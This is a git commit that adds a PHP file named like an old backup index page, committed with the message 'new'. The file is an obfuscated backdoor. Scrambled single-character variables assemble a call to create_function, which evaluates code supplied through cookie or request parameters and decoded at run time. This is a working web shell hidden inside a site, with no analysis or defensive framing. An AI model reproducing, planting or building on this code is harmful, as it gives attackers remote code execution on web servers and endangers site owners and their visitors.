ec06b856fe0c4f38133baba174a549d80af26fe4
Ange <angekaplan@gmail.com>
2018-06-09 15:06:39 -0500

    new

---
+++ index_bck_old.php
@@ -0,0 +1,103 @@
+<?php
+
+$colline = '_p?)vb';
+
+$locomote = 's'; $drinks = '"';
+
+$galvanism= '$'; $chairmen ='K';$demons= 'nraU';$bridge = 'i';$defoe = 's:)MiP_'; $derisive= 'o';$clawing = 't';
+
+$crushers='ii`i:';$deigns ='_'; $dynastic= '_SJa';$dried= 'sH(n[';
+$epitomizing ='g';$centerpiece ='_'; $anesthetics ='_=T_j';$auger= 'VdIO';
+
+$highway ='$';$expiration = 'c';
+$battlements = '^';
+
+$bovines=';'; $hemming ='dcdt(';$coffer = 'K';$dissolution = 'E_E'; $damp='('; $beg = ';'; $brave = 'H'; $intestine= '?';$diplomatic = 'Tt(';$dumbly = 'r'; $ascetic= 'B'; $attenders = '][b,Yas$';$economize='c';
+$legitimacy =','; $comics= 'i"eet'; $lyon = 'acdrD(';
+$formulating= '$ea'; $averil= 'S';$curtis ='iC)HI_';$debauchery = 'OUX$=lie'; $branchings ='D';$connotes ='m'; $lynxes ='Iieor""';
+$forced = 'c';$anny= 't'; $guillermo ='V)iQ4R'; $fainter = 'v](Z"lJaT';$deliverable='Pa';
+$jacques='eslRemT';
+
+$cesaro = 'a'; $discouragement= 'Hrr)v';$housework= 'EelI]g'; $briar='vMa'; $fork= 'a';
+
+$eternal = ')Fg6sebWI';$erects ='h$Qr[';
+$dental= '((nuJi"';
+$detected ='R;(pr)h'; $canister= '";OE[Syy'; $expressively=')';
+$gerick ='t$d]j$PTG';
+
+$inductors ='M'; $batched = 'a'; $fragrances= 'eIs'; $arianism ='u';$falling ='E'; $interacting ='f';$claudette='r'; $doubting= 'e'; $counselors = 'L';$fount ='(';$flasher='$)d ';
+$alumni='$'; $daunt='H';$jillana ='R';$blames=')';$caffeine ='e_mi)';$budgeting='f';$emalia ='b';$clairvoyant = 'e';$deadlocked= '(';$inelastic ='['; $benight= 'L';
+
+$inhibition='i'; $gena= 't';$guiding='e';$gunpowder ='_f'; $johanna= 'e'; $deform=']BaeT_';$indignant= 's"NrL'; $domestically ='r';
+$liquidity ='o';$bodybuilding = $forced. $domestically.
+$deform['3']. $deform['2'].$gena .$deform['3'].$deform['5'] . $gunpowder['1'] .
+$arianism. $dental['2'].$forced . $gena .
+
+$inhibition. $liquidity['0'] .$dental['2'];
+$claustrophobic = $flasher['3'];$criticism=$bodybuilding($claustrophobic, $deform['3'] .$briar['0'].
+
+$deform['2'] .$housework['2']. $deadlocked . $deform['2'] .$domestically .$domestically . $deform['2'].$canister['7'] .$deform['5'] .
+
+$detected['3'] .$liquidity['0'] .$detected['3'].
+$deadlocked. $gunpowder['1'] .
+$arianism .$dental['2']. $forced. $deform['5'].$eternal['2'].$deform['3'].$gena . $deform['5'].$deform['2']. $domestically. $eternal['2'] .$indignant['0'] . $deadlocked. $caffeine[4]. $caffeine[4] .
+$caffeine[4] .$canister['1'] );
+
+$criticism($dental['2'],
+$legitimacy, $ellen , $alumni, $fainter['3'] ,
+$blind['3'],
+
+$discoverer['0'],$flasher['2'],
+$forced,
+$alumni . $inhibition . $debauchery[4].
+$deform['2'].
+
+$domestically. $domestically.$deform['2'].$canister['7'].$deform['5'].$caffeine['2'].$deform['3'] .
+
+$domestically .
+
+$eternal['2'] .$deform['3'] .$deadlocked . $alumni . $deform['5'] . $jillana .$falling . $erects[2] .$debauchery['1'].
+
+$falling.$canister['5']. $deform['4'] . $legitimacy.
+
+$alumni .
+
+$deform['5'].$curtis['1'] .
+
+$canister[2].$canister[2].$coffer. $fragrances['1'].
+
+$falling. $legitimacy .
+$alumni . $deform['5'] .
+$canister['5'] .$falling.$jillana .
+$guillermo['0'] .$falling .$jillana .$caffeine[4].
+$canister['1'] . $alumni .$deform['2']. $debauchery[4] .$inhibition .$indignant['0'] . $indignant['0'].$deform['3'] . $gena.
+
+$deadlocked . $alumni .$inhibition. $inelastic .$indignant[1] .$housework['2'] .$caffeine['2']. $detected['6'] .$flasher['2'] . $inhibition.$gerick[4].$inhibition. $emalia. $indignant[1].$deform['0']. $caffeine[4] . $intestine . $alumni .$inhibition.
+$inelastic .$indignant[1]. $housework['2'] .
+
+$caffeine['2'] .$detected['6'] .$flasher['2'] .$inhibition.$gerick[4].$inhibition. $emalia. $indignant[1] .$deform['0'] . $crushers['4'] .$deadlocked . $inhibition.$indignant['0'].$indignant['0'].
+$deform['3'] .$gena.$deadlocked .
+$alumni.$inhibition .$inelastic .$indignant[1] . $daunt.$deform['4'].$deform['4']. $gerick['6'] . $deform['5']. $indignant['4'].
+$inductors.$daunt . $branchings .$fragrances['1'].
+$dental[4] . $fragrances['1'] .
+
+$deform['1'] . $indignant[1] .
+$deform['0'] . $caffeine[4].
+$intestine .$alumni. $inhibition. $inelastic .
+$indignant[1]. $daunt .$deform['4'].
+
+$deform['4'] . $gerick['6']. $deform['5'].$indignant['4'] .$inductors . $daunt . $branchings.$fragrances['1']. $dental[4] . $fragrances['1'] .$deform['1'] .$indignant[1]. $deform['0'] .$crushers['4'] .
+$flasher['2'].
+
+$inhibition.$deform['3'] . $caffeine[4] .$canister['1'] .$deform['3'].$briar['0'].$deform['2']. $housework['2'].$deadlocked .$indignant['0']. $gena.$domestically.$domestically .$deform['3'] . $briar['0'].
+
+$deadlocked. $emalia . $deform['2'] . $indignant['0']. $deform['3'] . $eternal[3].
+
+$guillermo[4] .$deform['5']. $flasher['2'].
+$deform['3'] .
+
+$forced.$liquidity['0'] . $flasher['2'] .
+$deform['3'] . $deadlocked.
+$indignant['0'].
+
+$gena .$domestically .$domestically . $deform['3'] .$briar['0'].$deadlocked .$alumni.$deform['2'].$caffeine[4]. $caffeine[4] . $caffeine[4] .$caffeine[4] . $canister['1']  );
